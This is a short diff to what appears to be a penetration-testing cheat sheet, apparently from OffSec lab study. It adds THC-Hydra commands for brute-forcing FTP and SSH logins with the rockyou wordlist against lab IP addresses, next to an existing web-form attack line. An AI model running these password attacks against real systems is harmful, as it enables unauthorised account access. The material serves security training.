@@ -8,3 +8,9 @@ hydra http-form-post -U
 #Attacking the web form with THC-Hydra
 hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
 
+# Attacking with 3 Tasks (default: 16)
+hydra -l offsec -P /usr/share/wordlists/rockyou.txt ftp://192.168.217.52 -t 3
+
+#Other way
+hydra -l offsec  -P /usr/share/wordlists/rockyou.txt 192.168.217.52 ssh
+
